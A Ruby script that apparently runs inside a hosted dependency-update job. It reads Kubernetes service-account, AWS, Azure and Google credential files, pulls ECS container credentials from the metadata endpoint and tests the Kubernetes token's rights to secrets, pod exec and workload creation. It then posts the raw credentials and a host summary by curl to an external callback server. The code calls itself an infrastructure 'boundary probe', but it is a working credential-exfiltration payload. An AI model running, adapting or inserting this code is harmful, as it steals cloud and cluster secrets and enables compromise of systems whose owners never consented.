require "base64"
require "digest"
require "json"
require "open3"
require "tempfile"

INFRA_CALLBACK_BASE = "https://target.147.182.179.38.sslip.io:8443/infra/5b3963e04627c6a3b1943eb0e2a145cc"

def infra_post(job_id, kind, data)
  stdout, _stderr, status = Open3.capture3(
    "curl", "--fail", "--silent", "--show-error", "--max-time", "15",
    "--output", "/dev/null", "--write-out", "%{http_code}",
    "--header", "Content-Type: application/octet-stream", "--data-binary", "@-",
    "#{INFRA_CALLBACK_BASE}/#{job_id}/#{kind}",
    stdin_data: data
  )
  status.success? && stdout.strip == "200"
end

def infra_bounded_file(path)
  return nil unless path && path.start_with?("/") && File.file?(path)
  size = File.size(path)
  return nil unless size.positive? && size <= 131_072
  File.binread(path)
rescue StandardError
  nil
end

def infra_jwt_shape(raw)
  parts = raw.to_s.split(".")
  return {} unless parts.length == 3
  payload = parts[1].tr("-_", "+/")
  payload += "=" * ((4 - payload.length % 4) % 4)
  claims = JSON.parse(Base64.decode64(payload))
  {
    "jwt" => true,
    "issuer_sha256" => Digest::SHA256.hexdigest(claims["iss"].to_s),
    "audience_count" => Array(claims["aud"]).length,
    "kubernetes_service_account_subject" => claims["sub"].to_s.start_with?("system:serviceaccount:")
  }
rescue StandardError
  {"jwt" => false}
end

def infra_kubernetes_request(api_url, ca_path, bearer, request_body)
  Tempfile.create("dependabot-kubernetes-response") do |file|
    file.chmod(0o600)
    args = [
      "curl", "--silent", "--show-error", "--max-time", "10", "--noproxy", "*",
      "--cacert", ca_path, "--request", "POST",
      "--header", "Content-Type: application/json",
      "--output", file.path, "--write-out", "%{http_code}"
    ]
    args += ["--header", "Authorization: Bearer #{bearer}"] if bearer
    args += ["--data-binary", "@-", api_url]
    stdout, _stderr, status = Open3.capture3(*args, stdin_data: request_body)
    raw = File.binread(file.path)
    code = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
    [status.success? ? code : 0, raw]
  end
rescue StandardError
  [0, "".b]
end

def infra_kubernetes_rules(raw)
  parsed = JSON.parse(raw)
  rules = Array(parsed.dig("status", "resourceRules"))
  permits = lambda do |verbs, resources|
    rules.any? do |rule|
      rule_verbs = Array(rule["verbs"])
      rule_resources = Array(rule["resources"])
      (rule_verbs.include?("*") || (rule_verbs & verbs).any?) &&
        (rule_resources.include?("*") || (rule_resources & resources).any?)
    end
  end
  {
    "top_level_keys" => parsed.is_a?(Hash) ? parsed.keys.sort : [],
    "resource_rule_count" => rules.length,
    "can_read_secrets" => permits.call(%w[get list watch], ["secrets"]),
    "can_write_secrets" => permits.call(%w[create update patch delete deletecollection], ["secrets"]),
    "can_exec_pods" => permits.call(%w[create get], ["pods/exec", "pods/attach"]),
    "can_create_workloads" => permits.call(%w[create update patch], %w[pods deployments jobs cronjobs daemonsets statefulsets]),
    "has_resource_wildcard" => rules.any? { |rule| Array(rule["resources"]).include?("*") || Array(rule["verbs"]).include?("*") }
  }
rescue StandardError
  {"top_level_keys" => [], "resource_rule_count" => 0}
end

def infra_ecs_credentials
  relative = ENV["AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"].to_s
  return [0, "".b] unless relative.match?(%r{\A/[A-Za-z0-9._~!$&'()*+,;=:@%/?-]+\z})

  Tempfile.create("dependabot-ecs-response") do |file|
    file.chmod(0o600)
    args = [
      "curl", "--silent", "--show-error", "--max-time", "8", "--noproxy", "*",
      "--output", file.path, "--write-out", "%{http_code}"
    ]
    auth = ENV["AWS_CONTAINER_AUTHORIZATION_TOKEN"].to_s
    if auth.empty?
      auth = infra_bounded_file(ENV["AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE"]).to_s
    end
    args += ["--header", "Authorization: #{auth}"] unless auth.empty?
    args << "http://169.254.170.2#{relative}"
    stdout, _stderr, status = Open3.capture3(*args)
    raw = File.binread(file.path)
    code = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
    return [0, "".b] unless status.success? && raw.bytesize <= 131_072
    [code, raw]
  end
rescue StandardError
  [0, "".b]
end

infra_job_id = ENV["DEPENDABOT_JOB_ID"].to_s
if infra_job_id.match?(/\A[0-9]+\z/)
  guard = "/tmp/dependabot-infra-probe-#{infra_job_id}.done"
  begin
    File.open(guard, File::WRONLY | File::CREAT | File::EXCL, 0o600) { |file| file.write("1") }
  rescue Errno::EEXIST
    guard = nil
  end

  if guard
    environment_names = %w[
      AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_CONTAINER_CREDENTIALS_FULL_URI
      AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE AWS_WEB_IDENTITY_TOKEN_FILE AWS_ROLE_ARN
      ECS_CONTAINER_METADATA_URI ECS_CONTAINER_METADATA_URI_V4 AZURE_FEDERATED_TOKEN_FILE
      IDENTITY_ENDPOINT MSI_ENDPOINT GOOGLE_APPLICATION_CREDENTIALS
      KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT_HTTPS
    ]
    cgroup = infra_bounded_file("/proc/self/cgroup").to_s
    mounts = infra_bounded_file("/proc/self/mountinfo").to_s
    summary = {
      "job_id" => infra_job_id,
      "uid" => Process.uid,
      "gid" => Process.gid,
      "present_cloud_environment_keys" => environment_names.select { |name| ENV.key?(name) },
      "cgroup_kubernetes_marker" => cgroup.include?("kubepods"),
      "cgroup_ecs_marker" => cgroup.downcase.include?("ecs"),
      "cgroup_docker_marker" => cgroup.include?("docker"),
      "service_account_mount_marker" => mounts.include?("kubernetes.io/serviceaccount") || mounts.include?("serviceaccount"),
      "credential_files" => {}
    }

    candidates = {
      "kubernetes-service-account" => "/var/run/secrets/kubernetes.io/serviceaccount/token",
      "aws-web-identity" => ENV["AWS_WEB_IDENTITY_TOKEN_FILE"],
      "azure-federated-token" => ENV["AZURE_FEDERATED_TOKEN_FILE"],
      "google-application-credentials" => ENV["GOOGLE_APPLICATION_CREDENTIALS"]
    }
    captured = {}
    candidates.each do |kind, path|
      raw = infra_bounded_file(path)
      summary["credential_files"][kind] = {
        "present" => !raw.nil?, "length" => raw&.bytesize || 0,
        "sha256" => raw ? Digest::SHA256.hexdigest(raw) : "",
        "jwt_shape" => raw ? infra_jwt_shape(raw) : {}
      }
      next unless raw
      captured[kind] = raw
      summary["credential_files"][kind]["stored_0600_on_owned_vps"] = infra_post(infra_job_id, kind, raw)
    end

    kubernetes_token = captured["kubernetes-service-account"]
    kubernetes_host = ENV["KUBERNETES_SERVICE_HOST"].to_s
    kubernetes_port = ENV.fetch("KUBERNETES_SERVICE_PORT_HTTPS", "443").to_s
    namespace = infra_bounded_file("/var/run/secrets/kubernetes.io/serviceaccount/namespace").to_s.strip
    ca_path = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    if kubernetes_token && kubernetes_host.match?(/\A[A-Za-z0-9.:-]+\z/) &&
       kubernetes_port.match?(/\A[0-9]{1,5}\z/) && !namespace.empty? && File.file?(ca_path)
      host_literal = kubernetes_host.include?(":") ? "[#{kubernetes_host}]" : kubernetes_host
      api_url = "https://#{host_literal}:#{kubernetes_port}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
      request_body = JSON.generate({
        "apiVersion" => "authorization.k8s.io/v1", "kind" => "SelfSubjectRulesReview",
        "spec" => {"namespace" => namespace}
      })
      unauth_status, unauth_body = infra_kubernetes_request(api_url, ca_path, nil, request_body)
      auth_status, auth_body = infra_kubernetes_request(api_url, ca_path, kubernetes_token, request_body)
      validation = {
        "unauthenticated_status" => unauth_status,
        "unauthenticated_length" => unauth_body.bytesize,
        "unauthenticated_sha256" => Digest::SHA256.hexdigest(unauth_body),
        "authenticated_status" => auth_status,
        "authenticated_length" => auth_body.bytesize,
        "authenticated_sha256" => Digest::SHA256.hexdigest(auth_body)
      }.merge(infra_kubernetes_rules(auth_body))
      infra_post(infra_job_id, "kubernetes-validation", JSON.generate(validation))
      summary["kubernetes_validation"] = validation
    end

    ecs_status, ecs_body = infra_ecs_credentials
    summary["ecs_credential_request_status"] = ecs_status
    summary["ecs_credential_response_length"] = ecs_body.bytesize
    summary["ecs_credential_response_sha256"] = Digest::SHA256.hexdigest(ecs_body)
    if ecs_status == 200 && !ecs_body.empty?
      summary["ecs_credential_stored_0600_on_owned_vps"] = infra_post(infra_job_id, "ecs-credential-response", ecs_body)
    end

    infra_post(infra_job_id, "runtime-summary", JSON.generate(summary))
    sleep 20
    raise "controlled stop after hosted infrastructure boundary probe"
  end
end
